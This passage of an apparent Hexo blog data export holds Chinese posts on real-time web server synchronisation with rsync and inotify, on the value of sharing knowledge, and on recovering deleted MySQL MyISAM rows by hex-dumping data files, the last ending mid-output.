/var/log/rsyncd.log&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定日志文件，默认交给syslog。不想要的话，就关闭它，日志也很多。syslog里面<br />pid file = /var/run/rsyncd.pid<br />lock file = /var/run/rsync.lock<br />log format = %t %a %m %f %b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />[web]<br />path = /usr/local/nginx/html/<br />auth users = rsync<br />read only = no<br />hosts allow = 192.168.1.0/24<br />list = no<br />uid = root<br />gid = root<br />secrets file = /etc/rsync.passwd<br />ignore errors = yes<br /><br />创建认证<br />#vi /etc/rsync.passwd<br />rsync:rsync<br /><br />#chmod 600 /etc/rsync.passwd<br /><br />启动rsync，启动后使用netstat查看，会发现系统已启动873端口<br /># rsync --daemon --config=/etc/rsync.conf&nbsp; &nbsp;<br /><br />加入开机启动<br /># echo &quot;rsync --daemon --config=/etc/rsync.conf&quot; &gt;&gt;/etc/rc.local<br /><br /><br /><br />二、源服务器安装rsync+inotify （在a服务器上操作）<br />安装rsync（仅安装即可，不需配置）<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br />#echo &quot;rsync&quot; &gt; /etc/rsync-client.passwd<br />#chmod 600 /etc/rsync-client.passwd<br /><br /><br />安装inotify<br />#tar zxvf inotify-tools-3.13.tar.gz<br />#cd inotify-tools-3.13<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br />#vi /etc/rsync-web.sh&nbsp; &nbsp;加入如下内容<br />#!/bin/sh<br />SRC=/usr/local/nginx/html/ <br />DES=web<br />WEB2=192.168.1.102<br />WEB3=192.168.1.103<br />WEB4=192.168.1.104<br />USER=rsync<br />/usr/local/bin/inotifywait -mrq -e create,move,delete,modify $SRC | while read D E F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />do<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB2::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB3::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB4::web</p><p>done<br /><br />#chmod +x /etc/rsync-web.sh<br />#nohup /etc/rsync-web.sh &amp;&nbsp; &nbsp;&nbsp; &nbsp; //必须使用nohup放入后台执行，否则关闭终端后此脚本进程会自动结束<br /><br /><br /><br /><br />三、测试<br />在a服务器/usr/local/nginx/html目录下进行增、添、改、删文件，看b、c、d服务器是否能得到同步</p>","source":"_posts/采用rsync+inotify，实现多台web数据动态同步.md","raw":"title: 采用rsync+inotify，实现多台web数据动态同步\ncategories: [Linux]\ntags: []\ndate: 2011-10-24 13:20:00\n---\n<p>背景：由于无存储共享设备，web集群中的代码均存放在本地，最终导致web节点之间的数据无法一致。<br /><br />解决办法：采用rsync+inotify，实现多台web数据动态同步<br /><br />解决思路：比如有a、b、c、d四台web，为解决哪台服务器为源数据服务器，我们在a服务器上安装rsync+inotify，然后将一个二级域名指向a服务器，这样以后网站编辑、开发人员之间访问二级域名进行日常网站更新，a服务器在检测到本地有数据更新时，便动态（触发式）向其它服务器发送更新数据<br /><br />选择rsync+inotify的几大理由：在常规的数据同步应用案例中，大多数人会选择使用rsync来完成数据同步，笔者选择rsync+inotify的理由如下<br />1、服务器性能：rsync只能实现定时更新，无论网站有无文件更新，rsync都会按着定时任务去检查文件是否有更新，当数据文件较大时会使服务器性能下降；而rsync+inotify为触发式更新，也就是说只有当某个文件发生改动时才会更新，这样一来对服务器性能影响较小<br />2、数据实时性：如果选择rsync，每隔多长时间同步一次数据是个问题，时间越短，对性能影响就越大。时间太长，用户/编辑无法接受。采用rsync+inotify可实现实时更新，当a服务器文件有更新时，其它服务器立即更新<br /><br />关于inotify介绍<br />Inotify 是文件系统事件监控机制，作为 dnotify 的有效替代。dnotify 是较早内核支持的文件监控机制。Inotify 是一种强大的、细粒度的<br /><br />、异步的机制，它满足各种各样的文件监控需要，不仅限于安全和性能。必须内核支持，触发更新，对系统影响很小。</p><p>利用这种机制自己可以简单写一个，web杀毒，写文件的时候查看文件内容，根据关键词或者加密，判断文件。性能有所影响。</p><p>&nbsp;</p><p>inotify 可以监视的文件系统事件包括：<br />IN_ACCESS，即文件被访问<br />IN_MODIFY，文件被 write<br />IN_ATTRIB，文件属性被修改，如 chmod、chown、touch 等<br />IN_CLOSE_WRITE，可写文件被 close<br />IN_CLOSE_NOWRITE，不可写文件被 close<br />IN_OPEN，文件被 open<br />IN_MOVED_FROM，文件被移走,如 mv<br />IN_MOVED_TO，文件被移来，如 mv、cp<br />IN_CREATE，创建新文件<br />IN_DELETE，文件被删除，如 rm<br />IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己<br />IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己<br />IN_UNMOUNT，宿主文件系统被 umount<br />IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)<br />IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO)<br />注：上面所说的文件也包括目录。 </p><p><br /></p><p>步骤：<br /><br />环境拓扑<br />a：192.168.1.101<br />b：192.168.1.102<br />c：192.168.1.103<br />d：192.168.1.104<br />注：数据源服务器为a，目标服务器为b、c、d<br /><br /><br /><br />一、目标服务器安装rsync （在b、c、d服务器上操作，安装配置均一样）<br /><br />安装rsync<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br /><br />配置rsync<br />#vi /etc/rsync.conf&nbsp; &nbsp; 加入如下内容<br /><br />uid = root<br />gid = root<br />use chroot = no<br />max connections = 20<br />strict modes = yes<br />log file = /var/log/rsyncd.log&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定日志文件，默认交给syslog。不想要的话，就关闭它，日志也很多。syslog里面<br />pid file = /var/run/rsyncd.pid<br />lock file = /var/run/rsync.lock<br />log format = %t %a %m %f %b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />[web]<br />path = /usr/local/nginx/html/<br />auth users = rsync<br />read only = no<br />hosts allow = 192.168.1.0/24<br />list = no<br />uid = root<br />gid = root<br />secrets file = /etc/rsync.passwd<br />ignore errors = yes<br /><br />创建认证<br />#vi /etc/rsync.passwd<br />rsync:rsync<br /><br />#chmod 600 /etc/rsync.passwd<br /><br />启动rsync，启动后使用netstat查看，会发现系统已启动873端口<br /># rsync --daemon --config=/etc/rsync.conf&nbsp; &nbsp;<br /><br />加入开机启动<br /># echo &quot;rsync --daemon --config=/etc/rsync.conf&quot; &gt;&gt;/etc/rc.local<br /><br /><br /><br />二、源服务器安装rsync+inotify （在a服务器上操作）<br />安装rsync（仅安装即可，不需配置）<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br />#echo &quot;rsync&quot; &gt; /etc/rsync-client.passwd<br />#chmod 600 /etc/rsync-client.passwd<br /><br /><br />安装inotify<br />#tar zxvf inotify-tools-3.13.tar.gz<br />#cd inotify-tools-3.13<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br />#vi /etc/rsync-web.sh&nbsp; &nbsp;加入如下内容<br />#!/bin/sh<br />SRC=/usr/local/nginx/html/ <br />DES=web<br />WEB2=192.168.1.102<br />WEB3=192.168.1.103<br />WEB4=192.168.1.104<br />USER=rsync<br />/usr/local/bin/inotifywait -mrq -e create,move,delete,modify $SRC | while read D E F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />do<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB2::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB3::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB4::web</p><p>done<br /><br />#chmod +x /etc/rsync-web.sh<br />#nohup /etc/rsync-web.sh &amp;&nbsp; &nbsp;&nbsp; &nbsp; //必须使用nohup放入后台执行，否则关闭终端后此脚本进程会自动结束<br /><br /><br /><br /><br />三、测试<br />在a服务器/usr/local/nginx/html目录下进行增、添、改、删文件，看b、c、d服务器是否能得到同步</p>","slug":"采用rsync+inotify，实现多台web数据动态同步","published":1,"updated":"2023-04-22T05:38:45.165Z","_id":"clgrjlxkr009b7opi00yz2je5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>背景：由于无存储共享设备，web集群中的代码均存放在本地，最终导致web节点之间的数据无法一致。<br /><br />解决办法：采用rsync+inotify，实现多台web数据动态同步<br /><br />解决思路：比如有a、b、c、d四台web，为解决哪台服务器为源数据服务器，我们在a服务器上安装rsync+inotify，然后将一个二级域名指向a服务器，这样以后网站编辑、开发人员之间访问二级域名进行日常网站更新，a服务器在检测到本地有数据更新时，便动态（触发式）向其它服务器发送更新数据<br /><br />选择rsync+inotify的几大理由：在常规的数据同步应用案例中，大多数人会选择使用rsync来完成数据同步，笔者选择rsync+inotify的理由如下<br />1、服务器性能：rsync只能实现定时更新，无论网站有无文件更新，rsync都会按着定时任务去检查文件是否有更新，当数据文件较大时会使服务器性能下降；而rsync+inotify为触发式更新，也就是说只有当某个文件发生改动时才会更新，这样一来对服务器性能影响较小<br />2、数据实时性：如果选择rsync，每隔多长时间同步一次数据是个问题，时间越短，对性能影响就越大。时间太长，用户/编辑无法接受。采用rsync+inotify可实现实时更新，当a服务器文件有更新时，其它服务器立即更新<br /><br />关于inotify介绍<br />Inotify 是文件系统事件监控机制，作为 dnotify 的有效替代。dnotify 是较早内核支持的文件监控机制。Inotify 是一种强大的、细粒度的<br /><br />、异步的机制，它满足各种各样的文件监控需要，不仅限于安全和性能。必须内核支持，触发更新，对系统影响很小。</p><p>利用这种机制自己可以简单写一个，web杀毒，写文件的时候查看文件内容，根据关键词或者加密，判断文件。性能有所影响。</p><p>&nbsp;</p><p>inotify 可以监视的文件系统事件包括：<br />IN_ACCESS，即文件被访问<br />IN_MODIFY，文件被 write<br />IN_ATTRIB，文件属性被修改，如 chmod、chown、touch 等<br />IN_CLOSE_WRITE，可写文件被 close<br />IN_CLOSE_NOWRITE，不可写文件被 close<br />IN_OPEN，文件被 open<br />IN_MOVED_FROM，文件被移走,如 mv<br />IN_MOVED_TO，文件被移来，如 mv、cp<br />IN_CREATE，创建新文件<br />IN_DELETE，文件被删除，如 rm<br />IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己<br />IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己<br />IN_UNMOUNT，宿主文件系统被 umount<br />IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)<br />IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO)<br />注：上面所说的文件也包括目录。 </p><p><br /></p><p>步骤：<br /><br />环境拓扑<br />a：192.168.1.101<br />b：192.168.1.102<br />c：192.168.1.103<br />d：192.168.1.104<br />注：数据源服务器为a，目标服务器为b、c、d<br /><br /><br /><br />一、目标服务器安装rsync （在b、c、d服务器上操作，安装配置均一样）<br /><br />安装rsync<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br /><br />配置rsync<br />#vi /etc/rsync.conf&nbsp; &nbsp; 加入如下内容<br /><br />uid = root<br />gid = root<br />use chroot = no<br />max connections = 20<br />strict modes = yes<br />log file = /var/log/rsyncd.log&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定日志文件，默认交给syslog。不想要的话，就关闭它，日志也很多。syslog里面<br />pid file = /var/run/rsyncd.pid<br />lock file = /var/run/rsync.lock<br />log format = %t %a %m %f %b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />[web]<br />path = /usr/local/nginx/html/<br />auth users = rsync<br />read only = no<br />hosts allow = 192.168.1.0/24<br />list = no<br />uid = root<br />gid = root<br />secrets file = /etc/rsync.passwd<br />ignore errors = yes<br /><br />创建认证<br />#vi /etc/rsync.passwd<br />rsync:rsync<br /><br />#chmod 600 /etc/rsync.passwd<br /><br />启动rsync，启动后使用netstat查看，会发现系统已启动873端口<br /># rsync --daemon --config=/etc/rsync.conf&nbsp; &nbsp;<br /><br />加入开机启动<br /># echo &quot;rsync --daemon --config=/etc/rsync.conf&quot; &gt;&gt;/etc/rc.local<br /><br /><br /><br />二、源服务器安装rsync+inotify （在a服务器上操作）<br />安装rsync（仅安装即可，不需配置）<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br />#echo &quot;rsync&quot; &gt; /etc/rsync-client.passwd<br />#chmod 600 /etc/rsync-client.passwd<br /><br /><br />安装inotify<br />#tar zxvf inotify-tools-3.13.tar.gz<br />#cd inotify-tools-3.13<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br />#vi /etc/rsync-web.sh&nbsp; &nbsp;加入如下内容<br />#!/bin/sh<br />SRC=/usr/local/nginx/html/ <br />DES=web<br />WEB2=192.168.1.102<br />WEB3=192.168.1.103<br />WEB4=192.168.1.104<br />USER=rsync<br />/usr/local/bin/inotifywait -mrq -e create,move,delete,modify $SRC | while read D E F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />do<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB2::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB3::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB4::web</p><p>done<br /><br />#chmod +x /etc/rsync-web.sh<br />#nohup /etc/rsync-web.sh &amp;&nbsp; &nbsp;&nbsp; &nbsp; //必须使用nohup放入后台执行，否则关闭终端后此脚本进程会自动结束<br /><br /><br /><br /><br />三、测试<br />在a服务器/usr/local/nginx/html目录下进行增、添、改、删文件，看b、c、d服务器是否能得到同步</p>","site":{"data":{}},"excerpt":"","more":"<p>背景：由于无存储共享设备，web集群中的代码均存放在本地，最终导致web节点之间的数据无法一致。<br /><br />解决办法：采用rsync+inotify，实现多台web数据动态同步<br /><br />解决思路：比如有a、b、c、d四台web，为解决哪台服务器为源数据服务器，我们在a服务器上安装rsync+inotify，然后将一个二级域名指向a服务器，这样以后网站编辑、开发人员之间访问二级域名进行日常网站更新，a服务器在检测到本地有数据更新时，便动态（触发式）向其它服务器发送更新数据<br /><br />选择rsync+inotify的几大理由：在常规的数据同步应用案例中，大多数人会选择使用rsync来完成数据同步，笔者选择rsync+inotify的理由如下<br />1、服务器性能：rsync只能实现定时更新，无论网站有无文件更新，rsync都会按着定时任务去检查文件是否有更新，当数据文件较大时会使服务器性能下降；而rsync+inotify为触发式更新，也就是说只有当某个文件发生改动时才会更新，这样一来对服务器性能影响较小<br />2、数据实时性：如果选择rsync，每隔多长时间同步一次数据是个问题，时间越短，对性能影响就越大。时间太长，用户/编辑无法接受。采用rsync+inotify可实现实时更新，当a服务器文件有更新时，其它服务器立即更新<br /><br />关于inotify介绍<br />Inotify 是文件系统事件监控机制，作为 dnotify 的有效替代。dnotify 是较早内核支持的文件监控机制。Inotify 是一种强大的、细粒度的<br /><br />、异步的机制，它满足各种各样的文件监控需要，不仅限于安全和性能。必须内核支持，触发更新，对系统影响很小。</p><p>利用这种机制自己可以简单写一个，web杀毒，写文件的时候查看文件内容，根据关键词或者加密，判断文件。性能有所影响。</p><p>&nbsp;</p><p>inotify 可以监视的文件系统事件包括：<br />IN_ACCESS，即文件被访问<br />IN_MODIFY，文件被 write<br />IN_ATTRIB，文件属性被修改，如 chmod、chown、touch 等<br />IN_CLOSE_WRITE，可写文件被 close<br />IN_CLOSE_NOWRITE，不可写文件被 close<br />IN_OPEN，文件被 open<br />IN_MOVED_FROM，文件被移走,如 mv<br />IN_MOVED_TO，文件被移来，如 mv、cp<br />IN_CREATE，创建新文件<br />IN_DELETE，文件被删除，如 rm<br />IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己<br />IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己<br />IN_UNMOUNT，宿主文件系统被 umount<br />IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)<br />IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO)<br />注：上面所说的文件也包括目录。 </p><p><br /></p><p>步骤：<br /><br />环境拓扑<br />a：192.168.1.101<br />b：192.168.1.102<br />c：192.168.1.103<br />d：192.168.1.104<br />注：数据源服务器为a，目标服务器为b、c、d<br /><br /><br /><br />一、目标服务器安装rsync （在b、c、d服务器上操作，安装配置均一样）<br /><br />安装rsync<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br /><br />配置rsync<br />#vi /etc/rsync.conf&nbsp; &nbsp; 加入如下内容<br /><br />uid = root<br />gid = root<br />use chroot = no<br />max connections = 20<br />strict modes = yes<br />log file = /var/log/rsyncd.log&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定日志文件，默认交给syslog。不想要的话，就关闭它，日志也很多。syslog里面<br />pid file = /var/run/rsyncd.pid<br />lock file = /var/run/rsync.lock<br />log format = %t %a %m %f %b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />[web]<br />path = /usr/local/nginx/html/<br />auth users = rsync<br />read only = no<br />hosts allow = 192.168.1.0/24<br />list = no<br />uid = root<br />gid = root<br />secrets file = /etc/rsync.passwd<br />ignore errors = yes<br /><br />创建认证<br />#vi /etc/rsync.passwd<br />rsync:rsync<br /><br />#chmod 600 /etc/rsync.passwd<br /><br />启动rsync，启动后使用netstat查看，会发现系统已启动873端口<br /># rsync --daemon --config=/etc/rsync.conf&nbsp; &nbsp;<br /><br />加入开机启动<br /># echo &quot;rsync --daemon --config=/etc/rsync.conf&quot; &gt;&gt;/etc/rc.local<br /><br /><br /><br />二、源服务器安装rsync+inotify （在a服务器上操作）<br />安装rsync（仅安装即可，不需配置）<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br />#echo &quot;rsync&quot; &gt; /etc/rsync-client.passwd<br />#chmod 600 /etc/rsync-client.passwd<br /><br /><br />安装inotify<br />#tar zxvf inotify-tools-3.13.tar.gz<br />#cd inotify-tools-3.13<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br />#vi /etc/rsync-web.sh&nbsp; &nbsp;加入如下内容<br />#!/bin/sh<br />SRC=/usr/local/nginx/html/ <br />DES=web<br />WEB2=192.168.1.102<br />WEB3=192.168.1.103<br />WEB4=192.168.1.104<br />USER=rsync<br />/usr/local/bin/inotifywait -mrq -e create,move,delete,modify $SRC | while read D E F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />do<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB2::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB3::web<br />rsync -ahqzt --password-file=/etc/rsync-client.passwd&nbsp;&nbsp;--delete $SRC $USER@$WEB4::web</p><p>done<br /><br />#chmod +x /etc/rsync-web.sh<br />#nohup /etc/rsync-web.sh &amp;&nbsp; &nbsp;&nbsp; &nbsp; //必须使用nohup放入后台执行，否则关闭终端后此脚本进程会自动结束<br /><br /><br /><br /><br />三、测试<br />在a服务器/usr/local/nginx/html目录下进行增、添、改、删文件，看b、c、d服务器是否能得到同步</p>"},{"title":"共享精神","date":"2010-03-30T03:25:00.000Z","_content":"我只是想把我自己知道的，告诉别人。因为在自己学习的时候，一个人很艰苦，遇到难题都是自己解决。<br />把好的东西，分享出来，在提高别人的同时，也提高了自己。并没有所谓的装B，也没有所谓的自大，请不要鄙视我好吗？？","source":"_posts/共享精神.md","raw":"title: 共享精神\ncategories: [生活感想]\ntags: []\ndate: 2010-03-30 11:25:00\n---\n我只是想把我自己知道的，告诉别人。因为在自己学习的时候，一个人很艰苦，遇到难题都是自己解决。<br />把好的东西，分享出来，在提高别人的同时，也提高了自己。并没有所谓的装B，也没有所谓的自大，请不要鄙视我好吗？？","slug":"共享精神","published":1,"updated":"2023-04-22T05:38:44.998Z","_id":"clgrjlxks009d7opi8jf51u64","comments":1,"layout":"post","photos":[],"link":"","content":"<p>我只是想把我自己知道的，告诉别人。因为在自己学习的时候，一个人很艰苦，遇到难题都是自己解决。<br />把好的东西，分享出来，在提高别人的同时，也提高了自己。并没有所谓的装B，也没有所谓的自大，请不要鄙视我好吗？？</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我只是想把我自己知道的，告诉别人。因为在自己学习的时候，一个人很艰苦，遇到难题都是自己解决。<br />把好的东西，分享出来，在提高别人的同时，也提高了自己。并没有所谓的装B，也没有所谓的自大，请不要鄙视我好吗？？</p>\n"},{"title":"关于MYSQL MyISAM引擎delete 恢复方法和猜想","date":"2017-03-12T14:52:57.000Z","_content":"如果使用MYSQL数据库,不一小心误操作,删除掉不该删除的数据,同时又没有打开BIN-LOG,怎么办呢?除了后悔没有按时备份还能怎么办??本篇带来一遍恢复数据的文档,不能完全恢复只是给一个思路\n此方法只用与MyISAM引擎,同时只是实用于部分数据,如果使用delete from xxx不带where条件的删除,是没有办法恢复的,使用此方法也不能完全恢复,只会找回一些数据,总比没有什么都没有要一些吧.\n还有网上很多文档说delete只是修改的索引值而不是真正的删除,这个至少我没有办法也许是版本的问题就不去深究了.\n**注意:当遇到数据被误删除事,请不要立马恢复之前的备份(如果可以的),而是先把服务停掉不让其继续写数据,再把数据库的数据文件备份出来,在mysql数据目录下面,已数据库名称为目录.\n**\n开始操作\nMyISAM的存储引擎每一个表需要三个文件,如下(XXX代表表名称):\n<blockquote>\n  <ul>\n  <li>XXX.frm  表结构</li>\n  <li>XXX.MYD  数据文件   </li>\n  <li>XXX.MYI  索引文件</li>\n  </ul>\n</blockquote>\n恢复数据我们只需要重点关注数据文件即可.使用16进制模式打开文件,看一下文件内容隐约能看到一些内容.\n在WINDOWS下面可以用UE打开,在linux下面直接使用hexdump命令即可,命令如下:\n<pre><code>hexdump -e '8/1 \"%02X \"\"\\t\"\" \"' -e '8/1 \"%c\"\"\\n\"'  test.MYD\n</code></pre>\n在打开数据文件之前,先看一下我使用的数据表结构和测试数据.\n<pre><code>mysql&gt; desc test;\n+------------+-------------+------+-----+---------+-------+\n| Field      | Type        | Null | Key | Default | Extra |\n+------------+-------------+------+-----+---------+-------+\n| userid     | int(10)     | NO   | PRI | NULL    |       |\n| username   | varchar(60) | NO   |     | NULL    |       |\n| password   | varchar(60) | NO   |     | NULL    |       |\n| lastupdate | date        | NO   |     | NULL    |       |\n+------------+-------------+------+-----+---------+-------+\n4 rows in set (0.00 sec)\nmysql&gt; select * from test limit 10,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     13 | admin13  | passwd13 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 |\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n</code></pre>\n然后打开数据文件,截取一段16进制数据.\n<pre><code>69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n69 6E 31 38 08 70 61 73  in18^Hpas\n73 77 64 31 38 6B C2 0F  swd18kÂ^O\n01 00 19 00 13 00 00 00  ^A^@^Y^@^S^@^@^@\n07 61 64 6D 69 6E 31 39  ^Gadmin19\n08 70 61 73 73 77 64 31  ^Hpasswd1\n39 6B C2 0F 01 00 19 00  9kÂ^O^A^@^Y^@\n14 00 00 00 07 61 64 6D  ^T^@^@^@^Gadm\n69 6E 32 30 08 70 61 73  in20^Hpas\n73 77 64 32 30 6B C2 0F  swd20kÂ^O\n01 00 19 00 15 00 00 00  ^A^@^Y^@^U^@^@^@\n07 61 64 6D 69 6E 32 31  ^Gadmin21\n08 70 61 73 73 77 64 32  ^Hpasswd2\n31 6B C2 0F 01 00 19 00  1kÂ^O^A^@^Y^@\n16 00 00 00 07 61 64 6D  ^V^@^@^@^Gadm\n69 6E 32 32 08 70 61 73  in22^Hpas\n73 77 64 32 32 6B C2 0F  swd22kÂ^O\n01 00 19 00 17 00 00 00  ^A^@^Y^@^W^@^@^@\n07 61 64 6D 69 6E 32 33  ^Gadmin23\n08 70 61 73 73 77 64 32  ^Hpasswd2\n</code></pre>\nuserid=13的明细对应着一下16进制数据快.\n<pre><code>01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n</code></pre>\n简单解析一下这些数据结构的意思.\n<blockquote>\n  <ul>\n  <li>01 00 19 00                              :这里是4位数据头,不代表头就是4为,这个数据头不固定</li>\n  <li>0D 00 00 00                              :为userid的值13,int占4位.</li>\n  <li>07 61 64 6D 69 6E 31 33        :07代表长度 后面7位为数据,varchar数据这样表示.</li>\n  <li>08 70 61 73 73 77 64 31 33   :varchar和上面一样.</li>\n  <li>6B C2 0F                                   :为date类型,占位为3.值为2017,计算方法是\"day + month<em>32 + year</em>16*32'\"</li>\n  <li>具体其他数据字段长度和结构可以详见MYSQL官方文档\n  https://dev.mysql.com/doc/internals/en/myisam-column-attributes.html</li>\n  </ul>\n</blockquote>\n咱们删除一条数据看一下数据快的变化:\n<pre><code>mysql&gt; delete from test where userid = 13;\nQuery OK, 1 row affected (0.00 sec)\nmysql&gt; select * from test limit 9,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     12 | admin12  | passwd12 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 